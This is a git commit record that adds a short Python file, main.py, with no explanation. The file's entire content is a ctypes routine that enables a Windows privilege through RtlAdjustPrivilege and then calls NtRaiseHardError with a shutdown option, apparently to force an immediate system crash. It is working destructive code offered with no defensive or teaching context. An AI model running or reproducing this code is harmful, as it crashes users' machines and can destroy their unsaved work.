bdf521386f673d87b12026629e5ef46869051b65
のってぃ <74302768+notthei@users.noreply.github.com>
2025-07-18 10:25:46 +0900

    Create main.py

---
+++ main.py
@@ -0,0 +1,5 @@
+import ctypes
+import os
+
+ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
+ctypes.windll.ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
